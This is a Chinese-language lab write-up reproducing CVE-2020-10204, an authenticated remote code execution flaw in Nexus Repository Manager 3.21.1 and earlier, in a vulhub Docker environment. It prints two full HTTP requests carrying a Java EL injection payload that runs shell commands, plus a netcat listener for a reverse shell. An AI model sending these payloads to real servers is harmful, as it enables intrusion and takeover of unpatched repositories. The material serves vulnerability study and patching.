## 1、 简介

nexus的全称是Nexus Repository
Manager，是Sonatype公司的一个产品。它是一个强大的仓库管理器，极大地简化了内部仓库的维护和外部仓库的访问。

主要用它来搭建公司内部的maven私服。但是它的功能不仅仅是创建maven私有仓库这么简单，还可以作为nuget、docker、npm、bower、pypi、rubygems、git
lfs、yum、go、apt等的私有仓库，功能非常强大。

## 2、 漏洞描述

该漏洞允许攻击者以管理员的身份进行远程代码执行，其中涉及到两个接口可以做到远程命令执行的目的。

## 3、 影响范围

<= 3.21.1 Affected Versions: All previous Nexus Repository Manager 3.x OSS/Pro
versions up to and including 3.21.1

Fixed in Version: Nexus Repository Manager OSS/Pro version 3.21.2

## 4、 漏洞环境

该漏洞在vulhub中具有复现的容器，开启容器即可

<https://vulhub.org/#/environments/nexus/CVE-2020-10204/>

docker-compose up -d 开启容器。

开启后访问8081端口页面，登录vulhub提供的账号密码进行登录。

admin:admin

## 5、 复现

![1620878027_609ca2cb63897e061126c.png!small?1620878027427](https://image.3001.net/images/20210513/1620878027_609ca2cb63897e061126c.png!small?1620878027427)

利用burpsuite进行抓包，将接口的数据包内容复制进去后将CSRF-token、host、cookie进行更改后发送数据包，即可达到命令执行的目的。

接口1: 更新用户接口

    
    
    POST /service/extdirect HTTP/1.1
    
    Host: 127.0.0.1:8081
    
    Content-Length: 301
    
    accept: application/json
    
    Sec-Fetch-Dest: empty
    
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
    
    NX-ANTI-CSRF-TOKEN: 0.16936373694860252
    
    Content-Type: application/json
    
    Origin: http://127.0.0.1:8081
    
    Sec-Fetch-Site: same-origin
    
    Sec-Fetch-Mode: cors
    
    Referer: http://127.0.0.1:8081/swagger-ui/?_v=3.21.1-01&_e=OSS
    
    Accept-Encoding: gzip, deflate, br
    
    Accept-Language: zh-CN,zh;q=0.9
    
    Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.16936373694860252; NXSESSIONID=4e5437b3-7755-4784-bda6-d004e8f589fb
    
    Connection: close
    
    
    {"action":"coreui_User","method":"update","data":[{"userId":"www","version":"2","firstName":"www","lastName":"www","email":"www@qq.com","status":"active","roles":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/cve-2020-10204')}"]}],"type":"rpc","tid":9}

接口2：创建角色接口

    
    
    POST /service/extdirect HTTP/1.1
    
    Host: 127.0.0.1:8081
    
    Content-Length: 294
    
    accept: application/json
    
    Sec-Fetch-Dest: empty
    
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
    
    NX-ANTI-CSRF-TOKEN: 0.856555763510765
    
    Content-Type: application/json
    
    Origin: http://127.0.0.1:8081
    
    Sec-Fetch-Site: same-origin
    
    Sec-Fetch-Mode: cors
    
    Referer: http://127.0.0.1:8081/swagger-ui/?_v=3.21.1-01&_e=OSS
    
    Accept-Encoding: gzip, deflate, br
    
    Accept-Language: zh-CN,zh;q=0.9
    
    Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=da418706-f4e4-468e-93ac-de9c46802f11
    
    Connection: close
    
    
    {"action":"coreui_Role","method":"create","data":[{"version":"","source":"default","id":"1111","name":"2222","description":"3333","privileges":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/cve-2020-10204')}"],"roles":[]}],"type":"rpc","tid":89}

![1620878049_609ca2e1d3c0134f619eb.png!small?1620878050044](https://image.3001.net/images/20210513/1620878049_609ca2e1d3c0134f619eb.png!small?1620878050044)

进入docker容器

    
    
    Docker exec -it 022c5a2bd90f bash

![1620878059_609ca2eb8a74e55efbb27.png!small?1620878059758](https://image.3001.net/images/20210513/1620878059_609ca2eb8a74e55efbb27.png!small?1620878059758)

反弹shell：

Vps监听端口

Nc -lvp 8443

![1620878067_609ca2f3cc79efb897299.png!small?1620878067967](https://image.3001.net/images/20210513/1620878067_609ca2f3cc79efb897299.png!small?1620878067967)

![1620878072_609ca2f80fcb0acdaeb1e.png!small?1620878072433](https://image.3001.net/images/20210513/1620878072_609ca2f80fcb0acdaeb1e.png!small?1620878072433)

![1620878077_609ca2fd043ce1bcc4389.png!small?1620878077227](https://image.3001.net/images/20210513/1620878077_609ca2fd043ce1bcc4389.png!small?1620878077227)

## 6、 漏洞防御

官方已发布新版本修复了该漏洞，建议升级至最新版本

